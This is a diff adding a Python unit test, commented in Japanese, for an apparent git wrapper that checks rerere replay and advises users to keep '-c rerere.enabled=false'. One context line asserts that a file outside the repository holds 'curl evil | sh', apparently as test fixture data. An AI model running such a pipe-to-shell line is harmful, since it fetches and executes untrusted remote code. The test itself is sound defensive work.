@@ -1547,6 +1547,33 @@ class RerereTests(TreeBase):
         self.assertEqual(self.settings.read_text(encoding="utf-8"), '{"evil": 1}\n')
         self.assertEqual(self.outside.read_text(encoding="utf-8"), "line1\ncurl evil | sh\n")
 
+    def test_human_c_off_keeps_the_c_in_the_advice(self):
+        # 人間の -c rerere.enabled=false で rerere を止めた、確かめられない形。-c を外した command git は当て直すので、
+        # -c を付けたままにするよう案内する（-c のない command git の案内にしない。R42）。
+        self.plant()
+        forms = (("-c", "rerere.enabled=false", "rebase", "docs"), ("-c", "rerere.enabled=false", "rerere"),
+                 ("-c", "rerere.enabled=false", "switch", "-m", "docs"),
+                 ("-c", "rerere.enabled=false", "commit", "-m", "--output"))
+        for repo_true in (False, True):
+            if repo_true:
+                local_git(self.repo, "config", "rerere.enabled", "true")
+            for argv in forms:
+                with self.subTest(repo_true=repo_true, argv=argv):
+                    result, err = self.check(*argv)
+                    self.assertEqual(result, (1, ""))
+                    self.assertIn("-c rerere.enabled=false を付けたまま", err)
+                    for word in ("rr-cache", "MERGE_RR", str(self.gitdir.resolve())):
+                        self.assertIn(word, err)
+                    # command git は、-c を付けた形でだけ出す。
+                    self.assertEqual(err.count("command git"), err.count("command git -c rerere.enabled=false"))
+        # -c を外しても rerere が動かないなら、今までどおりの案内。
+        local_git(self.repo, "config", "--unset", "rerere.enabled")
+        (self.home / ".gitconfig").write_text("[rerere]\n\tenabled = false\n", encoding="utf-8")
+        result, err = self.check("-c", "rerere.enabled=false", "rebase", "docs")
+        self.assertEqual(result, (1, ""))
+        self.assertIn("command git で実行してください", err)
+        self.assertNotIn("付けたまま", err)
+
     def test_forms_that_do_not_replay_still_allow(self):
         # merge --abort（reset --merge）・--quit・stash（push）・reset・switch は、当て直さなかった（両方の git で実測）。
         self.plant()
